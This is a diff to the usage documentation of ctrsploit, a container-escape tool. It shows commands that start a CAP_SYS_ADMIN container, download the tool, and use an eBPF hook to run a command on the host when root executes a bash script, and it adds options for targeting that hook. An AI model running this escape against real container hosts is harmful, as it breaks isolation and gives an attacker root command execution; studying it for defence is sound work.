@@ -69,7 +69,7 @@ $ ./ssh
 root@localhost:~# docker run -ti --cap-add=CAP_SYS_ADMIN busybox:latest ash
 / # wget https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
 / # chmod +x /usr/bin/ctrsploit
-/ # ctrsploit vul caps sys_admin x ebpf bash
+/ # ctrsploit vul caps sys_admin x ebpf bash -c 'echo escaped'
 INFO[0000] Waiting for events..
 ```
 
@@ -83,5 +83,17 @@ echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 EOF
 root@localhost:~# chmod +x 1.sh
 root@localhost:~# ./1.sh 
-Hello from eBPF!!! Nice to meet you
+escaped
 ```
+
+## 6. Advance
+
+### 6.1 --once: exit after first hit
+
+/bin/bash will open fd 255 after each execve, so the command will be executed many times even in the same script.
+
+use `--once` to exit after the first hit.
+
+### 6.2 --cmd: specify command
+
+### 6.3 --root: only hook root user's bash script
